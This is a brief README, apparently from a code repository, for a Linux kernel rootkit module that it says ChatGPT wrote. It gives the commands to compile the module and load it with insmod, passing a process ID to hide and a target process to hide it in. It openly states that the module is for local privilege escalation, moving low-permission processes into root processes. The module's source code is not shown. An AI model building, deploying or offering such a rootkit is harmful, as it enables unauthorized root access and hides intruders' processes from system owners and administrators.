# Linux-Module-Process-Mogrator-Rootkit
Written by ChatGPT receiving target PID and Migrate PID in command line


sudo apt-get install linux-headers-$(uname -r)

gcc -o pid_migrator.o -c pid_migrator.c -I /lib/modules/$(uname -r)/build/include

make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

sudo insmod pid_migrator.ko migrate_pid=<MIGRATE_PID> target_pid=<TARGET_PID>


EDIT <Migrate PID> for the pid you are moving and <Target PID> for the task process you are hiding it in.

This is a Linux Kernel Rootkit so be careful
TO BE USED TO MIGRATE LOW PERMISSION PROCESSES TO ROOT PROCESS FOR LOCAL PRIVILEGE ESCALATION

